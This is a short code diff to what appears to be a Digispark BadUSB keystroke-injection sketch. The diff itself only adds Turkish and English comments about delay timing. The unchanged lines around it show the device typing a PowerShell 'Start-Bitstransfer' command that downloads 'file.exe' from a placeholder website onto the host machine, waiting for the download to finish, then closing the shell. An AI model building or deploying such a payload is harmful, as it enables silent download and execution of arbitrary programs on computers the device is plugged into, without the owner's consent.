@@ -23,7 +23,8 @@ void loop() {
   DigiKeyboard.print("Start-Bitstransfer https://www.youwebsite.com/file.exe file.exe");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  // BURADAKİ SANİYE MİKTARI DOSYANIN BOYUTUNA GÖRE DÜŞÜRÜLÜR VEYA YÜKSELTİLİR:
+  // BURADAKİ DELAY YANİ BEKLEME SÜRESİ DOSYANIN BOYUTUNA GÖRE DÜŞÜRÜLÜR VEYA YÜKSELTİLİR.
+  // THE WAIT TIME HERE IS REDUCED OR INCREASED ACCORDING TO THE SIZE OF THE FILE.
   DigiKeyboard.delay(8000);
   DigiKeyboard.print("exit");
   DigiKeyboard.delay(500);
@@ -43,5 +44,6 @@ void loop() {
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   // BURADAKİ 100000 SANİYE KOMUTLAR BİTTİKTEN SONRA EN BAŞTAN TEKRARLAMASIN DİYE.
+  // This is to avoid repeating the command
   DigiKeyboard.delay(100000);
 }
